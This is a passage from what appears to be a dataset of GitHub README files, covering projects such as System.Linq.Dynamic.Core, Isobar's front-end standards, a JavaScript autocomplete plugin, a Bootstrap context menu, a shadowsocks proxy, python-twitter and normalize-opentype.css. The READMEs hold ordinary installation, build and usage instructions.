Smells](https:\/\/sonarcloud.io\/api\/project_badges\/measure?project=system.linq.dynamic.core&metric=code_smells)](https:\/\/sonarcloud.io\/project\/issues?id=system.linq.dynamic.core&resolved=false&types=CODE_SMELL) |\n| &nbsp;&nbsp;**Sonar Coverage** | [![Sonar Coverage](https:\/\/sonarcloud.io\/api\/project_badges\/measure?project=system.linq.dynamic.core&metric=coverage)](https:\/\/sonarcloud.io\/component_measures?id=system.linq.dynamic.core&metric=coverage) |\n| &nbsp;&nbsp;**Codecov** | [![codecov](https:\/\/codecov.io\/gh\/StefH\/System.Linq.Dynamic.Core\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/StefH\/System.Linq.Dynamic.Core) |\n| &nbsp;&nbsp;**Coveralls** | [![Coverage Status](https:\/\/coveralls.io\/repos\/github\/StefH\/System.Linq.Dynamic.Core\/badge.svg?branch=master)](https:\/\/coveralls.io\/github\/StefH\/System.Linq.Dynamic.Core?branch=master) |\n| |\n| ***Nuget*** | &nbsp; |\n| &nbsp;&nbsp;**System.Linq.Dynamic.Core** | [![NuGet](https:\/\/buildstats.info\/nuget\/System.Linq.Dynamic.Core)](https:\/\/www.nuget.org\/packages\/System.Linq.Dynamic.Core) |\n| &nbsp;&nbsp;**EntityFramework.DynamicLinq** | [![NuGet](https:\/\/buildstats.info\/nuget\/EntityFramework.DynamicLinq)](https:\/\/www.nuget.org\/packages\/EntityFramework.DynamicLinq) |\n| &nbsp;&nbsp;**Microsoft.EntityFrameworkCore.DynamicLinq** | [![NuGet](https:\/\/buildstats.info\/nuget\/Microsoft.EntityFrameworkCore.DynamicLinq)](https:\/\/www.nuget.org\/packages\/Microsoft.EntityFrameworkCore.DynamicLinq) |\n| &nbsp;&nbsp;**Z.EntityFramework.Classic.DynamicLinq** | [![NuGet](https:\/\/buildstats.info\/nuget\/Z.EntityFramework.Classic.DynamicLinq)](https:\/\/www.nuget.org\/packages\/Z.EntityFramework.Classic.DynamicLinq) |\n| ***MyGet (previews)*** | &nbsp; |\n| &nbsp;&nbsp;**System.Linq.Dynamic.Core** | [![MyGet](https:\/\/buildstats.info\/myget\/system-linq-dynamic-core\/System.Linq.Dynamic.Core)](https:\/\/www.myget.org\/feed\/system-linq-dynamic-core\/package\/nuget\/System.Linq.Dynamic.Core) |\n| &nbsp;&nbsp;**EntityFramework.DynamicLinq** | [![MyGet](https:\/\/buildstats.info\/myget\/system-linq-dynamic-core\/EntityFramework.DynamicLinq)](https:\/\/www.myget.org\/feed\/system-linq-dynamic-core\/package\/nuget\/EntityFramework.DynamicLinq) |\n| &nbsp;&nbsp;**Microsoft.EntityFrameworkCore.DynamicLinq** | [![MyGet](https:\/\/buildstats.info\/myget\/system-linq-dynamic-core\/Microsoft.EntityFrameworkCore.DynamicLinq)](https:\/\/www.myget.org\/feed\/system-linq-dynamic-core\/package\/nuget\/Microsoft.EntityFrameworkCore.DynamicLinq) |\n| &nbsp;&nbsp;**Z.EntityFramework.Classic.DynamicLinq** | [![MyGet](https:\/\/buildstats.info\/myget\/system-linq-dynamic-core\/Z.EntityFramework.Classic.DynamicLinq)](https:\/\/www.myget.org\/feed\/system-linq-dynamic-core\/package\/nuget\/Z.EntityFramework.Classic.DynamicLinq) |\n\n# Development Details\n\n## Frameworks\nThe following frameworks are supported:\n- net35, net40, net45, net46 and up\n- netstandard1.3 & netstandard2.0\n- uap10.0 (UAP 10.0.14393.0)\n\n## Fork details\nThis fork takes the basic library to a new level. Contains XML Documentation and examples on how to use it. Also adds unit testing to help ensure that it works properly.\n\nSome background:\nI forked from https:\/\/github.com\/NArnott\/System.Linq.Dynamic and added some more functionality there.<br>My fork is still visible on github [https:\/\/github.com\/StefH\/System.Linq.Dynamic], however I decided to start a new project + nuget to avoid confusion and create the project according to the new VS2017 + .NET Core rules \/ standards.\n\nHowever, currently there are multiple nuget packages and projects available:\n\n| Project | NuGet | Author | Comment |\n| ------- | ----- | ------ | ------- |\n| [kahanu\/System.Linq.Dynamic][2a] | [System.Linq.Dynamic][2b] | @kahanu | - |\n| [kavun\/System.Linq.Dynamic.3.5][3a] | [System.Linq.Dynamic.3.5\/][3b] | @kavun | only 3.5 and VB.NET |\n| [NArnott\/System.Linq.Dynamic][4a] | [System.Linq.Dynamic.Library][4b]  | @NArnott | removed from github + nuget ? |\n| [dynamiclinq.codeplex][5a] | - | dialectsoftware | - |\n| [dynamic-linq][6a] | - | scottgu | - |\n\n[2a]: https:\/\/github.com\/kahanu\/System.Linq.Dynamic\n[2b]: https:\/\/www.nuget.org\/packages\/System.Linq.Dynamic\n[3a]: https:\/\/github.com\/kavun\/System.Linq.Dynamic.3.5\n[3b]: https:\/\/www.nuget.org\/packages\/System.Linq.Dynamic.3.5\/\n[4a]: https:\/\/github.com\/NArnott\/System.Linq.Dynamic\n[4b]: https:\/\/www.nuget.org\/packages\/System.Linq.Dynamic.Library\n[5a]: https:\/\/dynamiclinq.codeplex.com\/\n[6a]: http:\/\/weblogs.asp.net\/scottgu\/dynamic-linq-part-1-using-the-linq-dynamic-query-library\n\n[doc-api]: http:\/\/stefh.github.io\/System.Linq.Dynamic.Core\n[doc-wiki]: https:\/\/github.com\/StefH\/System.Linq.Dynamic.Core\/wiki\/Dynamic-Expressions\n"},{"repo":"\/isobar-us\/code-standards","language":"HTML","readme_contents":"#  Isobar Front-end Development Standards and Guidelines\n\n## License:\n\nAll content licensed under Creative Commons Attribution 3.0 Unported License\n\n## Summary:\n\nThis document contains guidelines for web applications built by the Front-end development practice of Isobar. It is to be readily available to anyone who wishes to check or contribute to the iterative progress of our discipline's best practices.\n\nThis document's primary motivation is two-fold: \n\n 1. code consistency and \n 2. best practices. \n\nBy maintaining consistency in coding styles and conventions, we can ease the burden of legacy code maintenance, and mitigate risk of breakage in the future. By adhering to best practices, we ensure optimized page loading, performance and maintainable code.\n\nWe hope to encourage other developers to think about how to best standardize their approaches to development, to propose their own ideas for debate and for inclusion in our version of the document, and to adapt our standards for their own unique development practices. What better way of achieving consensus on how best to develop in our discipline than through feedback from members of that discipline themselves?\n\n## Intent for Build and Content\n\nWe hope to separate the structure of the document from the content contained in the standards themselves. Effectively, our goal is to be able to easily update the content without having to worry about the structure.\n\nThis also enables pull requests to focus on content and forks to the content to be easily re-branded.\n\n## Viewing the Document\n\nTo view the latest, you can just clone locally:\n\n```bash\ngit clone git:\/\/github.com\/isobar-idev\/code-standards.git\n```\n\nTo make changes using the process in place, please use the build process. The next few sections describe this build process.\n\n## Building the Document\n\n### Requirements\n\nThe build system uses [Grunt.js](http:\/\/gruntjs.com) via [Node.js](http:\/\/nodejs.org\/) and [SASS](http:\/\/sass-lang.com\/) via [libsass](http:\/\/libsass.org\/).\n\nFirst, install [Node.js](http:\/\/nodejs.org) from their Web site.\n\n### Build Details\n\nWe are using [Grunt](https:\/\/github.com\/gruntjs\/) to run the [Assemble](https:\/\/github.com\/assemble\/assemble\/) task to parse, populate variables, and combine files for the HTML, Markdown, and [Handlebars](http:\/\/handlebarsjs.com\/) templates.\n\n> Note: [Assemble](http:\/\/assemble.io) is an exceptionally active and flexible framework for building static HTML pages. It allows the usage of Handlebars, Markdown, and HTML files so we can gradually migrate to Markdown content files over time.\n\n> We suggest you check out [Assemble](http:\/\/assemble.io) as well.\n\nThe Gruntfile (`grunt.js`) includes the build for the multi-lingual copies of the document. There is a variable for `standards.defaultLanguage` which will determine what language the default `index.html` is rendered in.\n\nTo start with a clean slate, the Gruntfile has a `cleanup` task which will remove the previously generated `index.html` and associated language files.\n\nThere is also a `watch` task if you like to work that way.\n\n### Execute the Build\n\nRun `'npm install'` from the command line of the project directory to install all the node dependencies. You may need to occasionally re-run this command as new dependencies are added.\n\n> Windows: You may need to manually run `npm install -g grunt` and `npm install -g grunt-cli` to correctly set the path variables required to run grunt from the command line.\n\nRun `'grunt'` from the command line of the project directory to run the build process.\n\n### Structure of Page Content\n\nThe `*.html` files in the root are generated via `grunt` and should not be edited directly. There is one file per language, by language code.\n\n```\n.\/en.html\n.\/es.html\n.\/ru.html\n...\n```\nFinally, the `standards.defaultLanguage` setting determines which `*.html` file will be copied to the `index.html` file.\n\n> Note: In the near future the layout and templates will be updated to include the i18l language menus. \n\n#### Content\n\nThe content is written in Markdown files and the build converts it to HTML. Example:\n\n```\n.\/src\/content\/[lang]\/css.md\n.\/src\/content\/[lang]\/general.md\n.\/src\/content\/[lang]\/html.md\n```\n\n...and so on.\n\nEach of the `.md` files contained within these directories is a portion of the final output file. We have separated the different sections that make up the page into individual files so that it is easier to edit.\n\n#### Including A Content File\n\nThe content files are included as partials and the data and order is defined in the following folder and files:\n\n```\n.\/src\/content\/[lang]\/build\/[lang].hbs\n.\/src\/content\/[lang]\/build\/data.json\n```\n\nThe `data.json` file has special significance to Assemble, *do not rename this file*.\n\n#### Page Layout (Presentation)\n\nThe main layout is a Handlebars file that the content is injected into and language specific attributes are updated.\n\nThe file is `.\/src\/_layouts\/main.hbs`.\n\n### Structure of CSS\n\nThe CSS files are generated via LibSass from the SCSS files located in the SCSS folder, which is run as part of the Grunt task.\n\n\n### Deploy\n\nBecause github pages only serve static content, you must push your generated files to the gh-pages branch for updates to appear online. \n\n"},{"repo":"\/Pixabay\/JavaScript-autoComplete","language":"HTML","readme_contents":"JavaScript-autoComplete\n===================\n\nAn extremely lightweight and powerful vanilla JavaScript completion suggester.\n\nTested in Firefox, Safari, Chrome, Opera, Internet Explorer 8+. No dependencies, written in plain JavaScript.\nReleased under the MIT License: http:\/\/www.opensource.org\/licenses\/mit-license.php\n\nThis plugin was developed by [Pixabay.com](https:\/\/pixabay.com\/) - an international repository for sharing free public domain images.\nWe have implemented this piece of software in production on [plainJS](https:\/\/plainjs.com\/) and we share it - in the spirit of Pixabay - freely with others.\n\n## Demo and Documentation\n\nhttps:\/\/goodies.pixabay.com\/javascript\/auto-complete\/demo.html\n\n## Features\n\n* Lightweight: 5.4 kB of JavaScript - less than 2.4 kB gzipped\n* Fully flexible data source\n* Smart caching, delay and minimum character settings\n* Callbacks\n\n## Changelog\n\n### Version 1.0.4 - 2016\/02\/10\n\n* Included pull #6 and added offsetLeft\/offsetTop as optional parameter for suggestions container.\n\n\n### Version 1.0.3 - 2015\/11\/02\n\n* Fixed #2: Unspecified error on IE 10.\n\n### Version 1.0.2 - 2015\/08\/15\n\n* Fixed: Hide suggestions on fast input.\n* Fixed: Select item with tab.\n* Fixed: Incorrect selection by mouse when suggestions are scrolled down.\n\n### Version 1.0.1 - 2015\/06\/08\n\n* Simplified code and minor bug fixes.\n\n### Version 1.0.0 - 2015\/06\/07\n\n* Prevent unnecessary search on pressing enter.\n\n### Version 1.0.0 beta - 2015\/05\/12\n\n* First release\n"},{"repo":"\/sydcanem\/bootstrap-contextmenu","language":"HTML","readme_contents":"Bootstrap Context Menu\n======================\n\n#This project is unmaintained. Please use the alternative https:\/\/github.com\/swisnl\/jQuery-contextMenu.\n\nI have an issue with the plugin but I would still like to use it.\n\n-- Please fork the project and do your fixes.\n\nWhere can I get support if can't fix some issue?\n\n-- You can check the issues page or pull request page if someone has a fix for your problem and merge it with your fork.\n\nI still can't find fixes of my issues.\n\n-- Get plenty of sleep. :)\n\n\n## A context menu extension of Bootstrap made for everyone's convenience.\n\nSee a [demo page] [id].\n[id]:http:\/\/sydcanem.github.io\/bootstrap-contextmenu\/\n\nInstallation\n------------\n\n`bower install bootstrap-contextmenu`\n\nNote: Requires bootstrap.css\n\nUsage\n-----\n\n### Via data attributes\n\nAdd `data-toggle=\"context\"` to any element that needs a custom context menu and via CSS set `position: relative` to the element.\n\nPoint `data-target` attribute to your custom context menu.\n\n`<div class=\"context\" data-toggle=\"context\" data-target=\"#context-menu\"><\/div>`\n\n### Via Javascript\n\nCall the context menu via JavaScript:\n\n```js\n$('.context').contextmenu({\n  target:'#context-menu', \n  before: function(e,context) {\n    \/\/ execute code before context menu if shown\n  },\n  onItem: function(context,e) {\n    \/\/ execute on menu item selection\n  }\n})\n```\n\n### Options\n\n`target` - is the equivalent of the `data-target` attribute. It identifies the html of the menu that will be displayed. \n\n`before` - is a function that is called before the context menu is displayed. If this function returns false, the context menu will not be displayed. It is passed two parameters,\n\n  - `e` - the original event. (You can do an `e.preventDefault()` to cancel the browser event). \n  - `context` - the DOM element where right click occured.\n\n`onItem` - is a function that is called when a menu item is clicked. Useful when you want to execute a specific function when an item is clicked. It is passed two parameters,\n\n  - `context` - the DOM element where right click occured.\n  - `e` - the click event of the menu item, $(e.target) is the item element.\n\n`scopes` - DOM selector for dynamically added context elements. See [issue](https:\/\/github.com\/sydcanem\/bootstrap-contextmenu\/issues\/56).\n\n### Events\n\nAll events are fired at the context's menu. Check out `dropdown` plugin for\na complete description of events.\n\n- `show.bs.context` - This event fires immediately when the menu is opened. \n- `shown.bs.context` - This event is fired when the dropdown has been made visible to the user. \n- `hide.bs.context` - This event is fired immediately when the hide instance method has been called. \n- `hidden.bs.context` - This event is fired when the dropdown has finished being hidden from the user (will wait for CSS transitions, to complete).\n  \nSample\n\n```js\n$('#myMenu').on('show.bs.context',function () {\n  \/\/ do something...\n});\n```\n\nExample\n-------\n\nActivate and specify selector for context menu\n\n```js\n$('#main').contextmenu({'target':'#context-menu'});\n```\n\nActivate within a div, but not on spans\n\n```js\n$('#main').contextmenu({\n  target: '#context-menu2',\n  before: function (e, element, target) {\n      e.preventDefault();\n      if (e.target.tagName == 'SPAN') {\n          e.preventDefault();\n          this.closemenu();\n          return false;\n      }\n      return true;\n  }\n});\n```\n\nModify the menu dynamically\n\n```js\n$('#main').contextmenu({\n  target: \"#myMenu\",\n  before: function(e) { \n    this.getMenu().find(\"li\").eq(2).find('a').html(\"This was dynamically changed\");\n  }\n});\n```\n\nShow menu name on selection\n\n```js\n$('#main').contextmenu({\n  onItem: function(context, e) {\n    alert($(e.target).text());\n  }\n});\n```\n\n### Nice to have features:\n\n - Close and open animations\n - Keyboard shortcuts for menus\n\n### License\nMIT\n"},{"repo":"\/chrisalbon\/code_py","language":"HTML","readme_contents":"code_py\n=======\n\nSome well commented data science related code snippets in (mostly) Python 3. It was created by [Chris Albon](http:\/\/www.chrisalbon.com).\n\nThis collection of snippits is not comprehensive, and is in many places repetitive.\n\nYou can view all the snippits in [iPython Notebook Viewer](http:\/\/nbviewer.ipython.org\/github\/chrisalbon\/code_py\/tree\/master\/).\n"},{"repo":"\/shadowsocksr-backup\/shadowsocksr","language":"Python","readme_contents":"shadowsocks\n===========\n\n[![PyPI version]][PyPI]\n[![Build Status]][Travis CI]\n[![Coverage Status]][Coverage]\n\nA fast tunnel proxy that helps you bypass firewalls.\n\nServer\n------\n\n### Install\n\nDebian \/ Ubuntu:\n\n    apt-get install python-pip\n    pip install shadowsocks\n\nCentOS:\n\n    yum install python-setuptools && easy_install pip\n    pip install shadowsocks\n\nWindows:\n\nSee [Install Server on Windows]\n\n### Usage\n\n    ssserver -p 443 -k password -m aes-256-cfb\n\nTo run in the background:\n\n    sudo ssserver -p 443 -k password -m aes-256-cfb --user nobody -d start\n\nTo stop:\n\n    sudo ssserver -d stop\n\nTo check the log:\n\n    sudo less \/var\/log\/shadowsocks.log\n\nCheck all the options via `-h`. You can also use a [Configuration] file\ninstead.\n\nClient\n------\n\n* [Windows] \/ [OS X]\n* [Android] \/ [iOS]\n* [OpenWRT]\n\nUse GUI clients on your local PC\/phones. Check the README of your client\nfor more information.\n\nDocumentation\n-------------\n\nYou can find all the documentation in the [Wiki].\n\nLicense\n-------\n\nCopyright 2015 clowwindy\n\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may\nnot use this file except in compliance with the License. You may obtain\na copy of the License at\n\n    http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\nWARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\nLicense for the specific language governing permissions and limitations\nunder the License.\n\nBugs and Issues\n----------------\n\n* [Troubleshooting]\n* [Issue Tracker]\n* [Mailing list]\n\n\n\n[Android]:           https:\/\/github.com\/shadowsocks\/shadowsocks-android\n[Build Status]:      https:\/\/img.shields.io\/travis\/shadowsocks\/shadowsocks\/master.svg?style=flat\n[Configuration]:     https:\/\/github.com\/shadowsocks\/shadowsocks\/wiki\/Configuration-via-Config-File\n[Coverage Status]:   https:\/\/jenkins.shadowvpn.org\/result\/shadowsocks\n[Coverage]:          https:\/\/jenkins.shadowvpn.org\/job\/Shadowsocks\/ws\/PYENV\/py34\/label\/linux\/htmlcov\/index.html\n[Debian sid]:        https:\/\/packages.debian.org\/unstable\/python\/shadowsocks\n[iOS]:               https:\/\/github.com\/shadowsocks\/shadowsocks-iOS\/wiki\/Help\n[Issue Tracker]:     https:\/\/github.com\/shadowsocks\/shadowsocks\/issues?state=open\n[Install Server on Windows]: https:\/\/github.com\/shadowsocks\/shadowsocks\/wiki\/Install-Shadowsocks-Server-on-Windows\n[Mailing list]:      https:\/\/groups.google.com\/group\/shadowsocks\n[OpenWRT]:           https:\/\/github.com\/shadowsocks\/openwrt-shadowsocks\n[OS X]:              https:\/\/github.com\/shadowsocks\/shadowsocks-iOS\/wiki\/Shadowsocks-for-OSX-Help\n[PyPI]:              https:\/\/pypi.python.org\/pypi\/shadowsocks\n[PyPI version]:      https:\/\/img.shields.io\/pypi\/v\/shadowsocks.svg?style=flat\n[Travis CI]:         https:\/\/travis-ci.org\/shadowsocks\/shadowsocks\n[Troubleshooting]:   https:\/\/github.com\/shadowsocks\/shadowsocks\/wiki\/Troubleshooting\n[Wiki]:              https:\/\/github.com\/shadowsocks\/shadowsocks\/wiki\n[Windows]:           https:\/\/github.com\/shadowsocks\/shadowsocks-csharp\n"},{"repo":"\/bear\/python-twitter","language":"Python","readme_contents":"Python Twitter\n\nA Python wrapper around the Twitter API.\n\nBy the `Python-Twitter Developers <python-twitter@googlegroups.com>`_\n\n.. image:: https:\/\/img.shields.io\/pypi\/v\/python-twitter.svg\n    :target: https:\/\/pypi.python.org\/pypi\/python-twitter\/\n    :alt: Downloads\n\n.. image:: https:\/\/readthedocs.org\/projects\/python-twitter\/badge\/?version=latest\n    :target: http:\/\/python-twitter.readthedocs.org\/en\/latest\/?badge=latest\n    :alt: Documentation Status\n\n.. image:: https:\/\/circleci.com\/gh\/bear\/python-twitter.svg?style=svg\n    :target: https:\/\/circleci.com\/gh\/bear\/python-twitter\n    :alt: Circle CI\n\n.. image:: http:\/\/codecov.io\/github\/bear\/python-twitter\/coverage.svg?branch=master\n    :target: http:\/\/codecov.io\/github\/bear\/python-twitter\n    :alt: Codecov\n\n.. image:: https:\/\/requires.io\/github\/bear\/python-twitter\/requirements.svg?branch=master\n     :target: https:\/\/requires.io\/github\/bear\/python-twitter\/requirements\/?branch=master\n     :alt: Requirements Status\n\n.. image:: https:\/\/dependencyci.com\/github\/bear\/python-twitter\/badge\n     :target: https:\/\/dependencyci.com\/github\/bear\/python-twitter\n     :alt: Dependency Status\n\n============\nIntroduction\n============\n\nThis library provides a pure Python interface for the `Twitter API <https:\/\/dev.twitter.com\/>`_. It works with Python versions from 2.7+ and Python 3.\n\n`Twitter <http:\/\/twitter.com>`_ provides a service that allows people to connect via the web, IM, and SMS. Twitter exposes a `web services API <https:\/\/developer.twitter.com\/en\/docs>`_ and this library is intended to make it even easier for Python programmers to use.\n\n==========\nInstalling\n==========\n\nYou can install python-twitter using::\n\n    $ pip install python-twitter\n\n\nIf you are using python-twitter on Google App Engine, see `more information <GAE.rst>`_ about including 3rd party vendor library dependencies in your App Engine project.\n\n\n================\nGetting the code\n================\n\nThe code is hosted at https:\/\/github.com\/bear\/python-twitter\n\nCheck out the latest development version anonymously with::\n\n    $ git clone git:\/\/github.com\/bear\/python-twitter.git\n    $ cd python-twitter\n\nTo install dependencies, run either::\n\n\t$ make dev\n\nor::\n\n    $ pip install -Ur requirements.testing.txt\n    $ pip install -Ur requirements.txt\n\nNote that ```make dev``` will install into your local ```pyenv``` all of the versions needed for test runs using ```tox```.\n\nTo install the minimal dependencies for production use (i.e., what is installed\nwith ``pip install python-twitter``) run::\n\n    $ make env\n\nor::\n\n    $ pip install -Ur requirements.txt\n\n=============\nRunning Tests\n=============\nThe test suite can be run against a single Python version or against a range of them depending on which Makefile target you select.\n\nNote that tests require ```pip install pytest``` and optionally ```pip install pytest-cov``` (these are included if you have installed dependencies from ```requirements.testing.txt```)\n\nTo run the unit tests with a single Python version::\n\n    $ make test\n\nto also run code coverage::\n\n    $ make coverage\n\nTo run the unit tests against a set of Python versions::\n\n    $ make tox\n\n=============\nDocumentation\n=============\n\nView the latest python-twitter documentation at\nhttps:\/\/python-twitter.readthedocs.io. You can view Twitter's API documentation at: https:\/\/dev.twitter.com\/overview\/documentation\n\n=====\nUsing\n=====\n\nThe library provides a Python wrapper around the Twitter API and the Twitter data model. To get started, check out the examples in the examples\/ folder or read the documentation at https:\/\/python-twitter.readthedocs.io which contains information about getting your authentication keys from Twitter and using the library.\n\n----\nUsing with Django\n----\n\nAdditional template tags that expand tweet urls and urlize tweet text. See the django template tags available for use with python-twitter: https:\/\/github.com\/radzhome\/python-twitter-django-tags\n\n------\nModels\n------\n\nThe library utilizes models to represent various data structures returned by Twitter. Those models are:\n    * twitter.Category\n    * twitter.DirectMessage\n    * twitter.Hashtag\n    * twitter.List\n    * twitter.Media\n    * twitter.Status\n    * twitter.Trend\n    * twitter.Url\n    * twitter.User\n    * twitter.UserStatus\n\nTo read the documentation for any of these models, run::\n\n    $ pydoc twitter.[model]\n\n---\nAPI\n---\n\nThe API is exposed via the ``twitter.Api`` class.\n\nThe python-twitter requires the use of OAuth keys for nearly all operations. As of Twitter's API v1.1, authentication is required for most, if not all, endpoints. Therefore, you will need to register an app with Twitter in order to use this library. Please see the \"Getting Started\" guide on https:\/\/python-twitter.readthedocs.io for more information.\n\nTo generate an Access Token you have to pick what type of access your application requires and then do one of the following:\n\n- `Generate a token to access your own account <https:\/\/dev.twitter.com\/oauth\/overview\/application-owner-access-tokens>`_\n- `Generate a pin-based token <https:\/\/dev.twitter.com\/oauth\/pin-based>`_\n- use the helper script `get_access_token.py <https:\/\/github.com\/bear\/python-twitter\/blob\/master\/get_access_token.py>`_\n\nFor full details see the `Twitter OAuth Overview <https:\/\/dev.twitter.com\/oauth\/overview>`_\n\nTo create an instance of the ``twitter.Api`` with login credentials (Twitter now requires an OAuth Access Token for all API calls)::\n\n    >>> import twitter\n    >>> api = twitter.Api(consumer_key='consumer_key',\n                          consumer_secret='consumer_secret',\n                          access_token_key='access_token',\n                          access_token_secret='access_token_secret')\n\nTo see if your credentials are successful::\n\n    >>> print(api.VerifyCredentials())\n    {\"id\": 16133, \"location\": \"Philadelphia\", \"name\": \"bear\"}\n\n**NOTE**: much more than the small sample given here will print\n\nTo fetch a single user's public status messages, where ``user`` is a Twitter user's screen name::\n\n    >>> statuses = api.GetUserTimeline(screen_name=user)\n    >>> print([s.text for s in statuses])\n\nTo fetch a list of a user's friends::\n\n    >>> users = api.GetFriends()\n    >>> print([u.name for u in users])\n\nTo post a Twitter status message::\n\n    >>> status = api.PostUpdate('I love python-twitter!')\n    >>> print(status.text)\n    I love python-twitter!\n\nThere are many more API methods, to read the full API documentation either\ncheck out the documentation on `readthedocs\n<https:\/\/python-twitter.readthedocs.io>`_, build the documentation locally\nwith::\n\n    $ make docs\n\nor check out the inline documentation with::\n\n    $ pydoc twitter.Api\n\n----\nTodo\n----\n\nPatches, pull requests, and bug reports are `welcome <https:\/\/github.com\/bear\/python-twitter\/issues\/new>`_, just please keep the style consistent with the original source.\n\nIn particular, having more example scripts would be a huge help. If you have\na program that uses python-twitter and would like a link in the documentation,\nsubmit a pull request against ``twitter\/doc\/getting_started.rst`` and add your\nprogram at the bottom.\n\nThe twitter.Status and ``twitter.User`` classes are going to be hard to keep in sync with the API if the API changes. More of the code could probably be written with introspection.\n\nThe ``twitter.Status`` and ``twitter.User`` classes could perform more validation on the property setters.\n\n----------------\nMore Information\n----------------\n\nPlease visit `the google group <http:\/\/groups.google.com\/group\/python-twitter>`_ for more discussion.\n\n------------\nContributors\n------------\n\nOriginally two libraries by DeWitt Clinton and Mike Taylor which were then merged into python-twitter.\n\nNow it's a full-on open source project with many contributors over time. See AUTHORS.rst for the complete list.\n\n-------\nLicense\n-------\n\n| Copyright 2007-2016 The Python-Twitter Developers\n|\n| Licensed under the Apache License, Version 2.0 (the 'License');\n| you may not use this file except in compliance with the License.\n| You may obtain a copy of the License at\n|\n|     http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n|\n| Unless required by applicable law or agreed to in writing, software\n| distributed under the License is distributed on an 'AS IS' BASIS,\n| WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n| See the License for the specific language governing permissions and\n| limitations under the License.\n"},{"repo":"\/kennethormandy\/normalize-opentype.css","language":"HTML","readme_contents":"**Note** You might also like my more recent take on this project, [Utility OpenType](https:\/\/github.com\/kennethormandy\/utility-opentype): CSS utility classes for advanced typographic features.\n\n***\n\n[![Normalize-OpenType.css wordmark](assets\/wordmark.png)](http:\/\/kennethormandy.com\/journal\/normalize-opentype-css)\n\n***\n\n# Normalize-OpenType.css\n\nAdds OpenType features\u2014ligatures, kerning, and more\u2014to [Normalize.css](https:\/\/github.com\/necolas\/normalize.css).\n\nRead the blog post: [Introducing Normalize-OpenType.css](http:\/\/kennethormandy.com\/journal\/normalize-opentype-css)\n\n[<img alt=\"Get the latest version of the CSS file\" src=\"assets\/download.png\" width=\"150px\" \/>](https:\/\/raw.githubusercontent.com\/kennethormandy\/normalize-opentype.css\/master\/normalize-opentype.css)\n\n_Or use_\n\n```bash\nnpm install normalize-opentype.css\n```\n\n## Ligatures\n\nFirst, normalize basic ligatures across browsers, and then get fancier, discretionary ligatures on `<h1>`, `<h2>`, and `<h3>`s.\n\n![An example of basic and discretionary ligatures.](assets\/example-1.png)\n\n## Numerals\n\nDifferent situations require different numerals, depending on the context. Normalize-OpenType.css takes care of this for you, so you don\u2019t need to know what combination of Proportional, Lining, Tabular, and Old-Style numerals you need to use.\n\n![An example of old-style, proportional numerals.](assets\/example-2.png)\n\n![An example of tabular, lining numerals.](assets\/example-3.png)\n\n## Small Capitals\n\nRegular capitals draw a lot of attention in body copy. With Normalize-OpenType.css, anything wrapped in `<abbr>` will use small capitals instead. This works especially well with [Typogr.js](https:\/\/github.com\/ekalinin\/typogr.js) and equivalents.\n\n![An example of small capitals.](assets\/example-4.png)\n\n## Kerning\n\nKerning is turned on by default everywhere, and carefully turned off where it isn\u2019t appropriate. A monospaced typeface\u2019s application is ruined when automatic kerning is turned on. This is not the case with Normalize-OpenType.css; your code blocks have been preserved.\n\n![A kerning example.](assets\/example-5.png)\n\n## \u2026and more\n\nThere\u2019s more optimisations included, so you don\u2019t have to think about them: Lining, tabular numerals in code blocks, uppercase fallbacks for small capitals, and proper subscript and superscripts.\n\n## Getting started\n\nNormalize-OpenType.css aims to be as easy to use as its namesake, Normalize.css. If it\u2019s not that easy, please [open an issue](https:\/\/github.com\/kennethormandy\/normalize-opentype.css\/issues). Get the latest version of the CSS file here:\n\n[<img alt=\"Get the latest version of the CSS file\" src=\"assets\/download.png\" width=\"150px\" \/>](https:\/\/raw.githubusercontent.com\/kennethormandy\/normalize-opentype.css\/master\/normalize-opentype.css)\n\nAlternatively, use the package manager and build tool of your choice:\n\n#### With npm\n\n```\nnpm install normalize-opentype.css\n```\n\n#### With Component\n\n```bash\ncomponent install kennethormandy\/normalize-opentype.css\n```\n\n#### With bower\n\n```bash\nbower install normalize-opentype.css\n```\n\n### Include\n\nThough technically Normalize-OpenType.css is not dependent on Normalize.css, the intent expectation is that the former would not be used without the latter. If you\u2019re dropping in stylesheets:\n\n```html\n<link src=\"css\/normalize.css\" rel=\"stylesheet\" \/>\n<link src=\"css\/normalize-opentype.css\" rel=\"stylesheet\" \/>\n```\n\nIf you\u2019re using a preprocessor through something like [Harp](http:\/\/harpjs.com), you can import the files instead.\n\n```scss\n@import \"normalize\";\n@import \"normalize-opentype\";\n```\n\n### Caveats\n\nThis library does the best it can with what it has. In order to use any of these optimisations, they must also be available in the font you are using.\n\nI\u2019m working on some blog posts and documentation about this, and will be [sending them out via email](http:\/\/kennethormandy.com\/journal\/newsletter) if you\u2019re interested.\n\nThere\u2019s also a bug in Open Sans on Windows 7, with IE10 and 11, that\u2019s caused by `font-feature-settings`, which this stylesheet uses heavily. [We\u2019re keeping an eye on it.](https:\/\/github.com\/kennethormandy\/normalize-opentype.css\/issues\/4)\n\n## Running locally\n\nIf you\u2019d like to see the test suite, or just want to view things locally, use the following:\n\n```bash\ngit clone https:\/\/github.com\/kennethormandy\/normalize-opentype.css\ncd normalize-opentype.css\nnpm install\n```\nTo view the tests:\n\n```bash\nnpm test\n```\n\nTo compile any changes:\n\n```bash\nnpm build\n```\n\n## Contributing\n\nThanks for considering contributing! There\u2019s information about how to [get started with normalize-opentype here](CONTRIBUTING.md).\n\nIf you\u2019re new to all this GitHub, Open Source, JavaScript, Node.js, testing, wow all this stuff seems really difficult I just want to make my sites better stuff, I get it. I\u2019m still there, too. Feel free to [send me an email](mailto:kenneth@chloi.io) or [open an issue here](http:\/\/github.com\/kennethormandy\/normalize-opentype.css\/issues) and I\u2019ll do my best to share some resources that have helped me out.\n\n## Colophon\n\nNormalize-OpenType.css\u2019 wordmark, examples, and some tests set in the [Klinic Slab](http:\/\/www.losttype.com\/font_beta\/?name=klinic), designed by [Joe Prince](https:\/\/dribbble.com\/JoePrince). The manicules were designed by [Cade Cran](http:\/\/cadecran.com) for [Dan Gneiding](http:\/\/grayhood.com\/)\u2019s [Dude Hank 